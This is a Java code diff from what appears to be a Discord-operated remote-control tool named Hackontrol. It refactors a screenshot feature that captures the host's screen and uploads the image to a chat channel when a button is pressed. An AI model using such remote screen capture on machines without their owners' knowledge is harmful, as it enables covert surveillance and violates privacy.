@@ -11,7 +11,7 @@ import java.util.Calendar;
 import javax.imageio.ImageIO;
 
 import com.khopan.hackontrol.HackontrolChannel;
-import com.khopan.hackontrol.manager.button.ButtonInteraction;
+import com.khopan.hackontrol.manager.button.ButtonContext;
 import com.khopan.hackontrol.manager.button.ButtonManager;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.ErrorUtils;
@@ -57,9 +57,9 @@ public class ScreenshotChannel extends HackontrolChannel {
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ScreenshotChannel.SCREENSHOT_BUTTON_IDENTIFIER, this :: screenshot);
 	}
 
-	private void screenshot(ButtonInteraction interaction) {
+	private void screenshot(ButtonContext context) {
 		if(this.robot == null) {
-			ErrorUtils.sendErrorReply(interaction, this.Errors);
+			ErrorUtils.sendErrorReply(context, this.Errors);
 			return;
 		}
 
@@ -70,12 +70,12 @@ public class ScreenshotChannel extends HackontrolChannel {
 		try {
 			ImageIO.write(image, "png", stream);
 		} catch(Throwable Errors) {
-			ErrorUtils.sendErrorReply(interaction, Errors);
+			ErrorUtils.sendErrorReply(context, Errors);
 			return;
 		}
 
 		byte[] byteArray = stream.toByteArray();
-		interaction.getEvent().replyFiles(FileUpload.fromData(byteArray, ScreenshotChannel.getScreenshotFileName())).addActionRow(
+		context.replyFiles(FileUpload.fromData(byteArray, ScreenshotChannel.getScreenshotFileName())).addActionRow(
 				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Screenshot", ScreenshotChannel.SCREENSHOT_BUTTON_IDENTIFIER),
 				ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete")
 				).queue(ButtonManager :: dynamicButtonCallback);
